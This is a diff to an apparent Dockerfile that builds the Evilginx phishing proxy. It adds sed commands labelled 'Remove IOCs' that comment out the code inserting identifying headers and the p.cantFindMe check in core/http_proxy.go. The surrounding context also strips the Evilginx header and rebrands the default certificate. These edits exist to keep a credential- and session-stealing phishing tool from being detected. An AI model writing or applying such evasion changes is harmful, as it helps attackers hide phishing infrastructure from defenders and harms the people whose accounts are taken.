@@ -21,6 +21,15 @@ RUN mkdir -p ${GOPATH}/src/github.com/${GITHUB_USER} \
 ## Remove the Evilginx header
 RUN set -ex \
     && sed -i -e 's/req.Header.Set(p.getHomeDir(), o_host)/\/\/req.Header.Set(p.getHomeDir(), o_host)/g' ${PROJECT_DIR}/core/http_proxy.go
+
+# Remove IOCs
+RUN set -ex \
+    && sed -i -e 's/egg2 := req.Host/\/\/egg2 := req.Host/g' \
+     -e 's/e_host := req.Host/\/\/e_host := req.Host/g' \
+     -e 's/req.Header.Set(string(hg), egg2)/\/\/req.Header.Set(string(hg), egg2)/g' \
+     -e 's/req.Header.Set(string(e), e_host)/\/\/req.Header.Set(string(e), e_host)/g' \
+     -e 's/p.cantFindMe(req, e_host)/\/\/p.cantFindMe(req, e_host)/g' ${PROJECT_DIR}/core/http_proxy.go
+    
 ## Rename the selfsigned certificate used in developer mode (Thx to @Dreyvor - https://github.com/Dreyvor)
 RUN set -ex \
    && sed -i -e "s/Evilginx Signature Trust Co./${ORGANISATION_NAME}/g" \
